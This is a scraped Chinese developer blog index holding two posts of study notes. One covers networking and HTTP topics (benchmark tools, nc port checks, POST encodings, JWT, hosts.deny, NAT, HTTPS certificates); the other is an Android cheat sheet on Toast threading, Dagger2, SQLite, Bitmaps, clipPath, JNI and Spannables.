这种短期创建大量外网连接的行为会对路由器造成一定压力。。。。 ab(ApacheBench) - a simple ,single-threaded command line tool for benchemarking an HTTP server.因为是单线程的，所以并不能利用多核cpu的优势对server施加充分的负载。一般这么用 ab -n 1000 -c 100 http://example.com/ab -n -c : 属于netty的wrk wrk -H ‘Host: localhost’ -H ‘Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8’ -H ‘Connection: keep-alive’ -d 600 -c 1024 -t 8 http://127.0.0.1:8080/plaintext wrk -H ‘Host: localhost’ -H ‘Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8’ -H ‘Connection: keep-alive’ -d 600 -c 1024 -t 8 http://127.0.0.1:8080/plaintext wrk是一种http 跑分工具，tcp和udp测速需要iperf how-to-use-traceroute-and-mtr-to-diagnose-network-issues .well-known的意思，其实就跟robot.txt差不多。一种为了能够在客户端发起请求(但此时并不清楚url空间的允许策略，贸然访问万一侵权了呢)获得一些有用的信息。于是RFC就提出来搞一个专门的.well-known的path，这下面的位置都是广而周知的，大家都知道是特定的用途的。 已经有人对shadowsocks的源码进行了分析 nc其实就是netcat了，功能比较强大nc -vz 192.168.0.181 20060 //测试TCP端口可用性的方法nc -vuz IP port //测试udp端口可用性的方式，但实际测下来，就算server上udp port没开，还是会返回succeeded，所以这个也不可靠 netcat还可以实现udp聊天服务器上nc -ul 1080 // 会卡在这里，等待新的消息到达1080端口//客户端这边nc -u x.x.x.x 1080 //也会卡在这里，不过可以输入文字，按下回车，服务器这边就能收到消息了 wget –spider www.baidu.com //wget还有一个spider模式 “ping -l 1472 -f www.baidu.com”udp的MTU参数 美团的技术博客还不错前端安全系列之二：如何防止CSRF攻击？ https的url是加密的吗？是的，所以你可以把账户密码写在url后面发出去，这样是安全的，外界无法截获你的隐私信息.但着实不应该这样做，在浏览器地址栏和浏览器历史记录里面都留下了账户密码。可能会在http的referer里面带上你的url和隐私信息但是第一次client hello的时候host还是会明文写在包里,后面的query Parameters由于跟client hello无关，所以是加密的.Server Name IndicationSNI breaks the ‘host’ part of SSL encryption of URLs. You can test this yourself with wireshark. There is a selector for SNI // http post请求，设置content-type = Application/json，body里面放一个int或者long，实际传输的是string还是long?(猜测是string，因为要走utf-8之类的encoding过一遍，因为http是text-based协议)这事是有区别的，比如要post出去一个”6”，字符串6的ascii码是二进制：0011 0110十进制：54十六进制：36只需要一个字节 int 类型数字6 在java里是4个字节，在c语言里是2个或者四个字节。那么这个数字再大一点呢字符串66666666需要八个字节 int 类型数字66666666 在java里是4个字节，在c语言里是2个或者四个字节。需要四个字节 整体来讲，JSON 是文本的格式，整数和浮点数应该更占空间而且更费时。这就涉及到json和protobuff等二级制协议的比对了，从上面来看，如果你的内容是整数或者浮点数比较多的话，一大长串的数字用string的话就得花上很多内存，但是用int或者float的话可能四个字节就搞定了。所以这事没法绝对的说 都知道传输的都是byte数组，猜测传的类型是文字形式的。因为读取的时候多数是utf-8形式的，没办法特意指出这块byte是int还是string的一部分 post一个json出去的时候 {&quot;name&quot;:&quot;john&quot;} //事实上在byte层面是发送了这么些byte 123 { 34 &quot; 110 n 97 a 109 m 101 e 34 &quot; 58 : 34 &quot; 106 j 111 0 104 h 110 n 34 &quot; 125 } 这些标点符号都发送出去了，也就是占用的byte. 四种常见的POST提交数据方式 application/x-www-form-urlencodedmultipart/form-dataapplication/jsontext/xml application/json的post请求的长这样 POST / HTTP/1.1 Host: www.baidu.com User-Agent: ... Content-Length:27 Cookie: session=fsdaf;aaa=dfasf;...... {&quot;input1&quot;:&quot;xxx&quot;,&quot;input2&quot;:&quot;oo加密过的xxxxo&quot;,&quot;remember&quot;:false} application/x-www-form-urlencoded(浏览器的原生 form 表单)的post请求的长这样 POST / HTTP/1.1 Host: www.baidu.com User-Agent: ... Content-Length:27 Cookie: session=fsdaf;aaa=dfasf;...... name=user&amp;password=password multipart/form-data:(表单格式的)这一种是表单格式的，数据类型如下 POST / HTTP/1.1 Host: www.baidu.com User-Agent: ... Content-Length:27 Cookie: session=fsdaf;aaa=dfasf;...... ------WebKitFormBoundaryrGKCBY7qhFd3TrwA Content-Disposition: form-data; name=&quot;text&quot; title ------WebKitFormBoundaryrGKCBY7qhFd3TrwA Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;chrome.png&quot; Content-Type: image/png PNG ... content of chrome.png ... ------WebKitFormBoundaryrGKCBY7qhFd3TrwA-- text/xml:这种直接传的xml的post请求的长这样 POST / HTTP/1.1 Host: www.baidu.com User-Agent: ... Content-Length:27 Cookie: session=fsdaf;aaa=dfasf;...... &lt;!--?xml version=&quot;1.0&quot;?--&gt; &lt;methodcall&gt; &lt;methodname&gt;examples.getStateName&lt;/methodname&gt; &lt;params&gt; &lt;param&gt; &lt;value&gt;&lt;i4&gt;41&lt;/i4&gt;&lt;/value&gt; &lt;/params&gt; &lt;/methodcall&gt; data%3D%7B%22name%22%3A%22john%22%2C%22age%22%2C20%2C%22time%22%2C6%7D 这种东西通常是懒得看的，需要转码一下，粘贴到这个里面去就行了，或者自己encodeURIComponent一下就好其实是: data={“name”:”john”,”age”,20,”time”,6} 出处 HTTP 为超文本传输协议，整个的 HTTP 报文，如果按编程语言里面的类型来分的话，就是一大段字符串。值得注意的是，不像 JSON，application/x-www-form-urlencoded 的方式对复杂类型（例如数组）的处理，并没有严格的标准。有的接口使用 key[]=a&amp;key[]=b 来表示数组 key: [‘a’, ‘b’]，（这也是最常见的，jQuery、superagent等客户端会如此编码），有的库则将数组编码为：key=a&amp;key=b，有的则是携带下标进行编码：key[0]=a&amp;key[1]=b……十分混乱。所以如果是数组且数组的每一项为简单基本类型，而且非要用 application/x-www-form-urlencoded 进行序列化，那么不如用英文逗号分隔的字符串来表示。如果是嵌套对象……那么还是尽早使用 JSON 吧。 jwt事实上就是服务器颁发给客户端一个加密后（只有server才能解密）的字符串，客户端每次请求的时候就在header里面带上这个字符串。sessionless-authentication-withe-jwts If an attacker somehow manages to steal a user’s JWT, then there’s unfortunately not much that can really be done. To minimize damages, you should design your application to require reauthentication before performing any high profile transaction such as a purchase or the changing of a password. And your JWTs should also have an expiration date. That way a compromised JWT will only work for so long. 但是如果有人把这个header搞到，就能向服务器声称自己是该用户。服务器是只认这个jwt字符串不认人的，碰到这种情况其实也没什么解决办法，最多把jwt的有效期设置的短一点。 子网掩码表示一个网段的方式优先级为先检查hosts.deny，再检查hosts.allow，后者设定可越过前者限制，例如：a.限制所有的ssh，除非从218.64.87.0 - 127上来。hosts.deny:in.sshd:ALLhosts.allow:in.sshd:218.64.87.0/255.255.255.128 b.封掉218.64.87.0 - 127的telnethosts.denyin.sshd:218.64.87.0/255.255.255.128 c.限制所有人的TCP连接，除非从218.64.87.0 - 127访问hosts.denyALL:ALLhosts.allowALL:218.64.87.0/255.255.255.128 d.限制218.64.87.0 - 127对所有服务的访问hosts.denyALL:218.64.87.0/255.255.255.128 其中冒号前面是TCP daemon的服务进程名称，通常系统进程在/etc/inetd.conf中指定，比如in.ftpd，in.telnetd，in.sshd 其中IP地址范围的写法有若干中，主要的三种是： 1.网络地址–子网掩码方式： 218.64.87.0/255.255.255.0 2.网络地址方式（我自己这样叫，呵呵） 218.64.（即以218.64打头的IP地址） 3.缩略子网掩码方式，即数一数二进制子网掩码前面有多少个“1”比如： 218.64.87.0/255.255.255.0 – 218.64.87.0/24 比方说：在子网192.168.20.0/30中，能接收到目的地址为192.168.20.3的IP分组的最大主机数是（）到这个在线子网掩码计算器中输入，结果是可用ip 2掩码 255 255 255 252网络 192 168 20 0第一可用 192 168 20 1第二可用 192 168 20 2广播 192 168 20 3 解释下就是 30 说明前面有30个1，后面只剩下俩位，也就是四种可能，但有俩是要保留给网络和广播的，所以只剩下2个 NAPT原理简单来说，在NAT网关上会有一张映射表，表上记录了内网向公网哪个IP和端口发起了请求，然后如果内网有主机向公网设备发起了请求，内网主机的请求数据包传输到了NAT网关上，那么NAT网关会修改该数据包的源IP地址和源端口为NAT网关自身的IP地址和任意一个不冲突的自身未使用的端口，并且把这个修改记录到那张映射表上。最后把修改之后的数据包发送到请求的目标主机，等目标主机发回了响应包之后，再根据响应包里面的目的IP地址和目的端口去映射表里面找到该转发给哪个内网主机。这样就实现了内网主机在没有公网IP的情况下，通过NAPT技术借助路由器唯一的一个公网IP来访问公网设备。在较早以前的 RFC 1918 文档中对私有地址有相关的说明。 因特网域名分配组织IANA组织（Internet Assigned Numbers Authority）保留了以下三个IP地址块用于私有网络。 10.0.0.0 - 10.255.255.255 (10/8比特前缀) 172.16.0.0 - 172.31.255.255 (172.16/12比特前缀) 192.168.0.0 - 192.168.255.255 (192.168/16比特前缀) 我们可以看到其中有1个A类地址块，32个B类地址块和256个C类地址块。主流的家用路由器使用C类私有地址作为路由器LAN端的IP地址较多，所以我们可以看到路由器设置页面的IP一般都为192.168开头。 tcp keep-alive和http的keep-alive是两回事 http keep-alive是由webserver负责实现的。 关键字:http keepalive implementation http1.0中每个tcp连接用完了就关闭掉 http1.1中每个连接用完了不关闭,(保留一个keepAlive时间，在OkHttp里面默认一条连接在没有使用过的情况下保留5分钟才关闭) 这篇回答里解释了http keep-alive是为了让后续的http请求复用这一条tcp连接。而tcp的keep alive则是定期发小的包。 另外,http server并不会主动去问client是否还连着，只需要起一个timeout(到时间就掐掉这条tcp)就行了。下次客户端再来发起请求，重新起一条tcp吧。但是http keepalive在有些时候也是有问题的(http-keepAlive的缺点，多个请求同时到达就会因为头部阻塞而延迟，这种时候还不如重新搞一个socket处理)虽说HTTP/1.1 Keep-Alive特性支持多个请求在同一个连接上排队发送，在浏览器端正常的HTML等资源请求，会带来线头阻塞弊端，后一个请求依赖于前一个请求完成，一旦出现阻塞，后续请求只能排队等待。 移动APP后端网络处理一些问题记录HTTP/1.1 Pipelining（建立在Keep-Alive持久化基础之上，中文译为管线化，支持连续的幂等的GET/HEAD方法请求，实际环境下，并没有被浏览器所支持。同一个连接，处理同样的三次请求-响应） arp caches hash算法和加密哈希算法是不可逆的，而加密算法是可逆的哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要），而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。 具体来说，两者有如下重要区别： 1、哈希算法往往被设计成生成具有相同长度的文本，而加密算法生成的文本长度与明文本身的长度有关。 例如，设我们有两段文本：“Microsoft”和“Google”。两者使用某种哈希算法得到的结果分别为：“140864078AECA1C7C35B4BEB33C53C34”和“8B36E9207C24C76E6719268E49201D94”，而使用某种加密算法的到的结果分别为“Njdsptpgu”和“Hpphmf”。可以看到，哈希的结果具有相同的长度，而加密的结果则长度不同。实际上，如果使用相同的哈希算法，不论你的输入有多么长，得到的结果长度是一个常数，而加密算法往往与明文的长度成正比。 2、哈希算法是不可逆的，而加密算法是可逆的。 这里的不可逆有两层含义，一是“给定一个哈希结果R，没有方法将E转换成原目标文本S”，二是“给定哈希结果R，即使知道一段文本S的哈希结果为R，也不能断言当初的目标文本就是S”。其实稍微想想就知道，哈希是不可能可逆的，因为如果可逆，那么哈希就是世界上最强悍的压缩方式了——能将任意大小的文件压缩成固定大小。(这话的意思就是不同的内容可能会有相同的hashCode，所以在https加密中) 加密则不同，给定加密后的密文R，存在一种方法可以将R确定的转换为加密前的明文S。 https流程1.浏览器将自己支持的一套加密规则发送给网站。2.网站从中选出一组加密算法与HASH算法，并将自己的身份信息以证书的形式发回给浏览器。证书里面包含了网站地址，加密公钥，以及证书的颁发机构等信息。第 2步时服务器发送了一个SSL证书给客户端，SSL 证书中包含的具体内容有： （1）证书的发布机构CA（2）证书的有效期（3）公钥（4）证书所有者（5）签名 数字签名是用来验证数据完整性的，首先将公钥与个人信息用一个Hash算法生成一个消息摘要，Hash算法是不可逆的，且只要内容发生变化，那生成的消息摘要将会截然不同。然后CA再用它的私钥对消息摘要加密，最终形成数字签名。还把原始信息和数据签名合并，形成一个全新的东西，叫做“数字证书” 客户端在接受到服务端发来的SSL证书时，会对证书的真伪进行校验，以浏览器为例说明如下： （1）首先浏览器读取证书中的证书所有者、有效期等信息进行一一校验 （2）浏览器开始查找操作系统中已内置的受信任的证书发布机构CA，与服务器发来的证书中的颁发者CA比对，用于校验证书是否为合法机构颁发 （3）如果找不到，浏览器就会报错，说明服务器发来的证书是不可信任的。 （4）如果找到，那么浏览器就会从操作系统中取出 颁发者CA 的公钥，然后对服务器发来的证书里面的签名进行解密 （5）浏览器使用相同的hash算法计算出服务器发来的证书的hash值，将这个计算的hash值与证书中签名做对比 （6）对比结果一致，则证明服务器发来的证书合法，没有被冒充 （7）此时浏览器就可以读取证书中的公钥，用于后续加密了 4、所以通过发送SSL证书的形式，既解决了公钥获取问题，又解决了黑客冒充问题，一箭双雕，HTTPS加密过程也就此形成 我是这样理解这个https是如何解决中间人攻击问题的：数字证书包括：证书的发布机构CA，证书的有效期，公钥，证书所有者，签名（前面几个明文的hash值）作为一个中间人：我可以伪造证书的发布机构CA，证书的有效期，证书所有者，但是公钥我必须得换成我自己的啊（百度公钥加密的东西我又解不开），好了，这下明文内容肯定要改了。这下导致签名(hash值)不对了，客户端肯定不认，用百度发过来的的？当然不行了。瞎写一个？客户端拿着操作系统内置的CA证书去解密你这段瞎写的hash，肯定不对。唯一能实现对的上的情况是。让CA用自己的私钥把（百度的证书的发布机构CA，百度证书的有效期，我的公钥，百度的证书所有者这些东西加密一遍，这样客户端用CA解密出来的hash也一样了）。但是这怎么可能？ 参考常见网络协议优化与演进","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"Android知识集合[四]","date":"2018-04-13T13:53:52.000Z","path":"2018/04/13/2018-04-13-android-cheat-sheet-four/","text":"1. 在子线程中显示一个Toast是亲测可行的不是那种post到主线程的方案其实知乎上已经有了讨论 static class ToastThread extends Thread { Context mContext; public ToastThread(Context mContext) { this.mContext = mContext; } @Override public void run() { Looper.prepare(); String threadId = String.valueOf(Thread.currentThread().getId()); Toast.makeText(mContext,threadId,Toast.LENGTH_SHORT).show(); Looper.loop(); } } 其实Toast的原理就是通过IPC向NotificationManager请求加入队列，后者会检测权限xxxx。然后通过上面的ipc回调到客户端的onTransact中，这里也就是走到了Toast.TN这个static inner class的handler中，发送一个Message，handlerMessage中完成了WindowManager.addView的操作需要注意的是，这里还是子线程，所以确实可能存在多条线程同时操作UI的现象。从形式上看，主线程和子线程中的Toast对象各自通过自己的Looper维护了一个消息循环队列，这其中的消息类型包括show,hide和cancel。所以可能存在多条线程同时调用WindowManager的方法，View也是每条线程各自独有的，最坏的场景莫过于两条线程同时各自添加了一个View到window上。另外，子线程中引入looper的形式也造成了子线程实质上的阻塞，当然可以直接当成一个handlerThread来用。所以不是很推荐这么干，只是说可以做。Toast.TN.handleShow try { mWM.addView(mView, mParams); trySendAccessibilityEvent(); } catch (WindowManager.BadTokenException e) { /* ignore */ } 2.ContentProvider的onCreate要早于Application的onCreate发生比如ArchitectureComponent中的lifeCycle就是这么干的，写了个dummpy的contentProvider，在provider的onCreate中去loadLibrary. 3. 看到一个关于apk反编译和重新打包的帖子，非常好用Android apk反编译及重新打包流程，关键词apktool。但是，360加固之后的apk是不能用dex2jar查看java代码的。 4.从base.apk谈到apk安装的过程APK安装过程。之前无意间在FileExplorer中看到了base.apk这个文件，由此展开apk安装过程的研究。 5.关于模块化和项目重构很多关于Android甚至java项目的重构的文章都会最终提到两条：面向接口编程 -&gt; 依赖注入(IOC)然后跟上一大堆专业分析和没什么用的废话。这俩在java的领域翻译过来就是：在A模块中用Dagger2生成B模块中定义的interface的impl实例。其实不用Dagger2也行，就是每次在B模块的生命周期开始时准备一个HashMap这样的一大堆键值对，然后在A模块中根据想要的interface class去找impl class，用反射去创建，生产环境肯定不能这么干。在Dagger2中大致是这么干的： 先声明好B模块对外提供的接口，以下这俩都在另一个module中，A module通过gradle引用了B模块 public interface Store { String sell(); } public class StoreImpl implements Store { @Override public String sell() { return &quot;Dummy products&quot;; } } B模块中再提供Component和provide的module @Component(modules = StoreModule.class) public interface StoreComponent { Store eject(); } @Module public class StoreModule { @Provides Store provideStore() { return new StoreImpl(); } } A模块中最终使用的方式应该是 Store store = DaggerStoreComponent.builder().build().eject(); 6.写sqlite语句的时候总是容易出小错误//错误写法 CREATE TABLE IF NOT EXISTS table_one ( _id INTEGER PRIMARY KEY AUTOINCREMENT, studentName TEXT,studentNick TEXT) INSERT OR IGNORE INTO table_one (studentName,studentNick) VALUES ( name1,nick1) // SQLiteException: no such column: name1 (code 1) 报错 //正确写法 CREATE TABLE IF NOT EXISTS table_one ( _id INTEGER PRIMARY KEY AUTOINCREMENT, studentName TEXT,studentNick TEXT) INSERT OR IGNORE INTO table_one (studentName,studentNick) VALUES ( &#39;name1&#39;,&#39;nick1&#39;) 唯一的区别就在于name1和nick1这俩用 单引号单引号单引号 包起来了。 7. Webview的坑的总结WebView的那些坑 8.BitmapRegionDecoder不要随便用，到处是坑，主要问题和jpg图片的colorSpace有关，动不动就爆出IOException The Skia library on which BitmapRegionDecoder is based had some bugs that will not be fixed in versions of Android prior to Nougat or Oreo. It will still display the vast majority of images properly, but you may see problems displaying CMYK JPGs, and grayscale PNGs, especially on older devices. To reduce the frequency of these problems, the view automatically falls back to BitmapFactory when the image does not need to be subsampled.subsampling-scale-image-view这个库 9.Bitmap对象的recycle问题还是要调用Bitmap类有一个方法recycle()，从方法名可以看出意思是回收。这里就有疑问了，Android系统有自己的垃圾回收机制，可以不定期的回收掉不使用的内存空间，当然也包括Bitmap的空间。那为什么还需要这个方法呢？Bitmap类的构造方法都是私有的，所以开发者不能直接new出一个Bitmap对象，只能通过BitmapFactory类的各种静态方法来实例化一个Bitmap。仔细查看BitmapFactory的源代码可以看到，生成Bitmap对象最终都是通过JNI调用方式实现的。所以，加载Bitmap到内存里以后，是包含两部分内存区域的。简单的说，一部分是Java部分的，一部分是C部分的。这个Bitmap对象是由Java部分分配的，不用的时候系统就会自动回收了，但是那个对应的C可用的内存区域，虚拟机是不能直接回收的，这个只能调用底层的功能释放。所以需要调用recycle()方法来释放C部分的内存。从Bitmap类的源代码也可以看到，recycle()方法里也的确是调用了JNI方法了的。那如果不调用recycle()，是否就一定存在内存泄露呢？也不是的。Android的每个应用都运行在独立的进程里，有着独立的内存，如果整个进程被应用本身或者系统杀死了，内存也就都被释放掉了，当然也包括C部分的内存。Android对于进程的管理是非常复杂的。简单的说，Android系统的进程分为几个级别，系统会在内存不足的情况下杀死一些低优先级的进程，以提供给其它进程充足的内存空间。在实际项目开发过程中，有的开发者会在退出程序的时候使用Process.killProcess(Process.myPid())的方式将自己的进程杀死，但是有的应用仅仅会使用调用Activity.finish()方法的方式关闭掉所有的Activity。 10. 原来layer_list还可以这么用啊给一个View加边框，只在左边，上面和下面三条边上加边框，用layer_list就可以了 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;layer-list xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt; &lt;!-- 连框颜色值 --&gt; &lt;item&gt; &lt;shape&gt; &lt;solid android:color=&quot;@color/md_blue_700&quot; /&gt; &lt;/shape&gt; &lt;/item&gt; &lt;!-- 主体背景颜色值 --&gt; &lt;!-- 此处定义只有上下两边有边框 高度为1像素--&gt; &lt;item android:bottom=&quot;10dp&quot; android:left=&quot;10dp&quot; android:top=&quot;10dp&quot;&gt; &lt;!--边框里面背景颜色 白色--&gt; &lt;shape&gt; &lt;solid android:color=&quot;#ffffff&quot; /&gt; &lt;/shape&gt; &lt;/item&gt; &lt;/layer-list&gt; 11.proguard可以把log干掉-assumenosideeffects class android.util.Log { public static boolean isLoggable(java.lang.String, int); public static int v(...); public static int i(...); public static int w(...); public static int d(...); public static int e(...); } 12.国产Rom的权限问题是在是头疼以5.1的rom为例 if(ContextCompat.checkSelfPermission(activity,Manifest.permission.Camera)== PackageManager.PERMISSION_GRANTED): Camera c = Camera.open();// 还是null 类似的问题衍生出了国产手机5.0,6.0权限适配框架找到了启动魅族权限管理的Activity的代码 final String N_MANAGER_OUT_CLS = &quot;com.meizu.safe.permission.PermissionMainActivity&quot;; final String L_MANAGER_OUT_CLS = &quot;com.meizu.safe.SecurityMainActivity&quot;; // 5.1上叫做这个名字 final String PKG = &quot;com.meizu.safe&quot;; Activity activity = (Activity) context; Intent intent = new Intent(); intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); intent.putExtra(&quot;package&quot;, activity.getPackageName()); ComponentName comp = new ComponentName(PKG, L_MANAGER_OUT_CLS); intent.setComponent(comp); activity.startActivity(intent); 13. Canvas.clipPath会出现锯齿的问题以及可能的解决方案a Navive implementation of CircleImageView would look something like this:xml里面宽高都写成200dp，方便一点。 import android.content.Context; import android.graphics.Canvas; import android.graphics.Path; import android.graphics.RectF; import android.support.v7.widget.AppCompatImageView; import android.util.AttributeSet; public class RoundCornerImageView1 extends AppCompatImageView { float[] radiusArray = new float[8]; public RoundCornerImageView1(Context context) { super(context); init(); } public RoundCornerImageView1(Context context, AttributeSet attrs) { super(context, attrs); init(); } public RoundCornerImageView1(Context context, AttributeSet attrs, int defStyleAttr) { super(context, attrs, defStyleAttr); init(); } private void init() { setScaleType(ScaleType.CENTER_CROP); } public void setRadius(float leftTop, float rightTop, float rightBottom, float leftBottom) { radiusArray[0] = leftTop; radiusArray[1] = leftTop; radiusArray[2] = rightTop; radiusArray[3] = rightTop; radiusArray[4] = rightBottom; radiusArray[5] = rightBottom; radiusArray[6] = leftBottom; radiusArray[7] = leftBottom; invalidate(); } @Override protected void onDraw(Canvas canvas) { Path path = new Path(); int width = getWidth(); int height = getHeight(); setRadius(width/2,width/2,height/2,height/2); path.addRoundRect(new RectF(0, 0, width,height), radiusArray, Path.Direction.CW); canvas.clipPath(path); super.onDraw(canvas); } } 不出意外的话，在真机上运行会出现圆形边角有锯齿的问题。google一下clipPath锯齿就会发现类似的issue，framework只是对skia library的一层很薄的包装。 早先版本的系统画圆弧似乎不是特别准 多数时候对这种问题的解决方式是使用PorterDuff.SRCIN的方式，用canvas saveLayer(貌似layer是一种栈的结构)的方式在其他的layer中去画bitmap。最后顶层的layer全部pop掉之后会合并到initial的layer上，类似于在顶层的layer中合成这张bitmap。canvas.saveLayer(0, 0, w, h, null, Canvas.ALL_SAVE_FLAG); // 大致就在这里,layer似乎可以理解成photoShop里面的图层的概念 public class RoundCornerImageView2 extends AppCompatImageView { // 四个角的x,y半径 private float[] radiusArray = { 0f, 0f, 0f, 0f, 0f, 0f, 0f, 0f }; private Paint bitmapPaint = new Paint(Paint.ANTI_ALIAS_FLAG); private Bitmap makeRoundRectFrame(int w, int h) { Bitmap bm = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888); Canvas c = new Canvas(bm); Path path = new Path(); setRadius(w/2,w/2,h/2,h/2); path.addRoundRect(new RectF(0, 0, w, h), radiusArray, Path.Direction.CW); Paint bitmapPaint = new Paint(Paint.ANTI_ALIAS_FLAG); bitmapPaint.setColor(Color.GREEN); // 颜色随意，不要有透明度。 c.drawPath(path, bitmapPaint); return bm; } public RoundCornerImageView2(Context context) { super(context); init(); } public RoundCornerImageView2(Context context, AttributeSet attrs) { super(context, attrs); init(); } public RoundCornerImageView2(Context context, AttributeSet attrs, int defStyleAttr) { super(context, attrs, defStyleAttr); init(); } private void init() { // setLayerType(LAYER_TYPE_SOFTWARE, null); // Xfermode 需要禁用硬件加速 setScaleType(ScaleType.CENTER_CROP); } public void setRadius(float leftTop, float rightTop, float rightBottom, float leftBottom) { radiusArray[0] = leftTop; radiusArray[1] = leftTop; radiusArray[2] = rightTop; radiusArray[3] = rightTop; radiusArray[4] = rightBottom; radiusArray[5] = rightBottom; radiusArray[6] = leftBottom; radiusArray[7] = leftBottom; } @Override protected void onDraw(Canvas canvas) { final int w = getWidth(); final int h = getHeight(); Bitmap bitmapOriginal = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888); Canvas c = new Canvas(bitmapOriginal); super.onDraw(c); Bitmap bitmapFrame = makeRoundRectFrame(w, h); int sc = canvas.saveLayer(0, 0, w, h, null); canvas.drawBitmap(bitmapFrame, 0, 0, bitmapPaint); //先画一个圆形的框框条条出来 // 利用Xfermode取交集（利用bitmapFrame作为画框来裁剪bitmapOriginal） bitmapPaint.setXfermode(new PorterDuffXfermode(PorterDuff.Mode.SRC_IN)); //后续的画图操作，只有交集的部分才会显示在最终的canvas上 canvas.drawBitmap(bitmapOriginal, 0, 0, bitmapPaint); bitmapPaint.setXfermode(null); canvas.restoreToCount(sc); } } 这种方式一般称为离屏缓冲 14. jni使用一般使用javah生成header文件 多数教程都是写一个gradle.properties添加一句android.useDeprecatedNdk=true随着studio版本升级，还是不得不升级到使用cmake的方式。 Android Studio中集成c或者cpp代码照着这个官方的教程抄就行了。其实也就是写一个CMakeLists.txt，然后在studio里面右键app模块, Link C++ Project with Gradle。照着来就是了。 先写好java的native方法，然后cd到src/main/java路径javah -d jni com.your.package.name.classyoujustWroteWithnativeMethod 把生成的header文件剪切到和main/Java文件夹平级的jni文件夹中，再去写c的实现。注意的一小点是： printf是不会打印到logcat里面的，需要使用android/log.h头文件里面的东西 移植mp3lame到Android平台照着这里操作就行了。这篇博客使用的是lame-3.99.5，注意下载对应的版本。cmake的一些知识点cmake生成的.so文件在”\\app\\build\\intermediates\\cmake\\debug\\obj\\arm64-v8a”这个路径下。另外，CMakeLists.txt文件中比如说指定了生成的.so文件名字为xxx,那么在这个路径下找到的将会是libxxx.so java调用c语言性能还好,c语言调用java的性能就比较差了两头调来调去的例子下面是c层面调用java代码的例子，分别是调用java instance method 和java static method private String sex = &quot;female&quot;;//需要赋初始值或定义成static，不然在没有调用accessPublicMethod方法前，调用getSex方法会抛异常 public void setSex(String sex){ this.sex = sex; } public String getSex(){ return sex; } public native void accessPublicMethod(); //访问java中public方法 extern &quot;C&quot; void Java_com_honjane_ndkdemo_JNIUtils_accessPublicMethod( JNIEnv* env, jobject jobj){ //1.获得实例对应的class类 jclass jcls = env-&gt;GetObjectClass(jobj); //2.通过class类找到对应的method id //name 为java类中变量名，Ljava/lang/String; 为变量的类型String jmethodID jmid = env-&gt;GetMethodID(jcls,&quot;setSex&quot;,&quot;(Ljava/lang/String;)V&quot;); //定义一个性别赋值给java中的方法 char c[10] = &quot;male&quot;; jstring jsex = env-&gt;NewStringUTF(c); //3.通过obj获得对应的method env-&gt;CallVoidMethod(jobj,jmid,jsex); } private static int height = 160; public static int getHeight(){ return height; } public native int accessStaticMethod(); //访问java中static方法 extern &quot;C&quot; jint Java_com_honjane_ndkdemo_JNIUtils_accessStaticMethod( JNIEnv* env, jobject jobj){ //1.获得实例对应的class类 jclass jcls = env-&gt;GetObjectClass(jobj); //2.通过class类找到对应的method id jmethodID jmid = env-&gt;GetStaticMethodID(jcls,&quot;getHeight&quot;,&quot;()I&quot;); //3.静态方法通过class获得对应的method return env-&gt;CallStaticIntMethod(jcls,jmid); } //访问field用的是GetObjectClass和getXXXField(这里无论是public还是private field都能拿到) public class JNIUtils { public int num = 10; public native int addNum(); static { System.loadLibrary(&quot;native-lib&quot;); } } #include &lt;jni.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; //访问java对象中num属性，并对其作加法运算 extern &quot;C&quot; jint Java_com_honjane_ndkdemo_JNIUtils_addNum( JNIEnv* env, jobject jobj){ //1.获得实例对应的class类 jclass jcls = env-&gt;GetObjectClass(jobj); //2.通过class类找到对应的field id //num 为java类中变量名，I 为变量的类型int jfieldID fid = env-&gt;GetFieldID(jcls,&quot;num&quot;,&quot;I&quot;); //3.通过实例object获得对应的field jint jnum = env-&gt;GetIntField(jobj,fid); //add jnum += 10; return jnum; } 从jni层抛出一个java Exception也是可以的，其实就是new 一个java object(Exception) 1、当调用一个JNI函数后，必须先检查、处理、清除异常后再做其它 JNI 函数调用，否则会产生不可预知的结果。2、一旦发生异常，立即返回，让调用者处理这个异常。或 调用 ExceptionClear 清除异常，然后执行自己的异常处理代码。3、异常处理的相关JNI函数总结：1&gt; ExceptionCheck：检查是否发生了异常，若有异常返回JNI_TRUE，否则返回JNI_FALSE2&gt; ExceptionOccurred：检查是否发生了异常，若用异常返回该异常的引用，否则返回NULL3&gt; ExceptionDescribe：打印异常的堆栈信息4&gt; ExceptionClear：清除异常堆栈信息5&gt; ThrowNew：在当前线程触发一个异常，并自定义输出异常信息jint (JNICALL ThrowNew) (JNIEnv env, jclass clazz, const char msg);6&gt; Throw：丢弃一个现有的异常对象，在当前线程触发一个新的异常jint (JNICALL Throw) (JNIEnv env, jthrowable obj);7&gt; FatalError：致命异常，用于输出一个异常信息，并终止当前VM实例（即退出程序）void (JNICALL FatalError) (JNIEnv env, const char msg); jni是一套规范,oracle有一个文档，不同的vm照着这个规范实现就是了 关于Spannable String的问题Medium上有关于使用span的文章 Spantastic text styling with Spans 其实有SpannableString(mutable),SpannableStringBuilder还有SpannedString(immutable)。Just reading and not setting the text nor the spans? -&gt; SpannedString(文字和style都改不了)Setting the text and the spans? -&gt; SpannableStringBuilder(文字和Style都能改)Setting a small number of spans (&lt;~10)? -&gt; SpannableString(文字不能改，Style能改)Setting a larger number of spans (&gt;~10) -&gt; SpannableStringBuilder stackoverflow上甚至有Glide作者的讨论从源码来看,SpannedString和SpannableString几乎是一样的，后者继承了一个Spannable的接口，由此对外暴露了父类(SpannableStringInternal)的setSpan和removeSpan方法。 Use a SpannedString when your text has style but you don’t need to change either the text or the style after it is created. (似乎平时也应该这样使用，但从源码来看，两者几乎没有性能上的区别。真正的性能差异要取决于实际的use case)Use a SpannableString when your text doesn’t need to be changed but the styling does.Use a SpannableStringBuilder when you will need to update the text and its style. 